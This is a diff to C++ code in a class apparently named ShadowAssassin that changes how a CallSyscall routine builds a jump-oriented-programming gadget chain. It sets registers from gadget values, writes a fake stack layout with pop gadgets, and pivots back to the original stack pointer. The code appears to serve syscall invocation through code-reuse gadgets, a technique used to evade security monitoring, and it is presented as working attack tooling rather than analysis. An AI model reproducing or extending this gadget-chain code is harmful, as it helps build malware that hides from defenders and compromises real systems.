@@ -403,24 +403,26 @@ UINT64 ShadowAssassin::CallSyscall(const std::string& name, const std::vector<UI
 
 	frameManager.WriteRegister("rax", jopManager.GetRax());
 	frameManager.WriteRegister("rsi", jopManager.GetRsi());
+	frameManager.WriteRegister("rdx", jopManager.GetRdx()); // set directly — skip gadget2
+	frameManager.WriteRegister("rdi", jopManager.GetRdiForJmp());
 	frameManager.WriteRegister("rip", jopManager.GetRip());
 
-	// Stack layout (RSP starts at newRsp+0x58):
-	//   [newRsp+0x60] = originalRsp    ← gadget4 pop rsp restores real stack
-	//   [newRsp+0x58] = rdx_value      ← gadget2 pop rdx (above home space, safe)
-	//   [newRsp+0x50] = 0              ← gadget1 call pushes return addr here
-	//   [newRsp+0x30..+0x50] = function's 32-byte home space (can be clobbered)
-	//   [newRsp .. +0x30] = function locals / pushes (~900 bytes free)
+	// 3 trash pops clear home slots 1-3; gadget2 pops rdx from slot 4 [+0x50].
+	// [+0x30] = call return addr   (function entry RSP = newRsp+0x30)
+	// [+0x38] = home slot 1  → pop_rdi
+	// [+0x40] = home slot 2  → pop_rcx
+	// [+0x48] = home slot 3  → pop_rbx
+	// [+0x50] = GetRdx()     → gadget2 pop rdx  (home slot 4, hope R9 isn't spilled)
+	// [+0x58] = originalRsp  → gadget4 pop rsp
 	UINT64 originalRsp = frameManager.ReadStoredRegister("rsp");
-	UINT64 newRsp = originalRsp - 0x400; // 1KB below real RSP — plenty of room
+	UINT64 newRsp = originalRsp - 0x400;
 
-	writeFn(newRsp + 0x60, originalRsp);
-	writeFn(newRsp + 0x58, jopManager.GetRdx());
-	writeFn(newRsp + 0x50, 0);  // call overwrites with return addr
+	writeFn(newRsp + 0x60, originalRsp);       // gadget4 pop rsp
+	writeFn(newRsp + 0x58, jopManager.GetRdx()); // gadget2 pop rdx (after 4 trash pops)
 
-	frameManager.WriteRegister("rsp", newRsp + 0x58);
-	DbgLog("[CallSyscall] rsp=0x%llX rdx_slot=0x%llX orig_rsp_slot=0x%llX rdx_val=0x%llX\n",
-		newRsp + 0x58, newRsp + 0x58, newRsp + 0x60, jopManager.GetRdx());
+	frameManager.WriteRegister("rsp", newRsp + 0x38);
+	DbgLog("[CallSyscall] rsp=0x%llX rdx@+0x50=0x%llX orig@+0x58\n",
+		newRsp + 0x38, jopManager.GetRdx());
 
 
     UINT64 current_rip = frameManager.ReadRegister("rip");
